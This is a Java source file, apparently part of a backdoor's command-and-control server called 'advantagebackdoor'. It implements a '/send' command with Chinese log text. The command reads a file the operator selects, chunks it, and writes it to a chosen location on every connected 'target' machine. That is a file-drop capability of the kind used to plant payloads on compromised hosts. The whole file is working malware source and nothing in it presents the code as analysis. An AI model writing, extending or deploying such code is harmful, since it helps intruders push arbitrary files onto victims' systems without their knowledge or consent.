package me.faintcloudy.advantagebackdoor.server.command;

import me.faintcloudy.advantagebackdoor.api.connection.UserConnection;
import me.faintcloudy.advantagebackdoor.api.message.play.server.ServerFileMessage;
import me.faintcloudy.advantagebackdoor.server.Log4jServer;
import org.apache.commons.io.IOUtils;

import javax.swing.*;
import javax.swing.filechooser.FileSystemView;
import java.io.*;
import java.util.Arrays;
import java.util.UUID;

public class SendFileCommand extends ServerCommand {
    public SendFileCommand() {
        super("/send", "向对方发送文件");
    }

    @Override
    public void execute(String[] args) {
        if (args.length < 2)
        {
            Log4jServer.getInstance().getLogger().info("正确用法: /send <目标主机上的位置>");
            return;
        }

        JFileChooser chooser = new JFileChooser();
        FileSystemView view = FileSystemView.getFileSystemView();
        chooser.setCurrentDirectory(view.getHomeDirectory());
        chooser.setDialogTitle("选择一个文件, 并发送至目标");
        chooser.setApproveButtonText("选择");
        if (chooser.showOpenDialog(null) == JFileChooser.APPROVE_OPTION)
        {
            File file = chooser.getSelectedFile();
            String location = args[1] + File.separator + file.getName();
            try {
                FileInputStream in = new FileInputStream(file);
                byte[] wholeBytes = IOUtils.toByteArray(in);
                UUID uuid = UUID.randomUUID();
                for (int i = 0;i<wholeBytes.length;i+=40000)
                {
                    try {
                        Thread.sleep(100);
                    } catch (InterruptedException e) {
                        e.printStackTrace();
                    }
                    boolean end = i + 40000 >= wholeBytes.length;
                    byte[] bytes = end ? Arrays.copyOfRange(wholeBytes, i, wholeBytes.length) : Arrays.copyOfRange(wholeBytes, i, i + 40000);
                    ServerFileMessage serverFileMessage = new ServerFileMessage(bytes, uuid, end, location);
                    for (UserConnection target : Log4jServer.getInstance().getTargets()) {
                        target.sendMessage(serverFileMessage);
                    }
                }
                Log4jServer.getInstance().getLogger().info("已向 " + Log4jServer.getInstance().getTargets().size() + " 个目标发送了文件包");
            } catch (IOException e) {
                e.printStackTrace();
            }

        }
    }
}
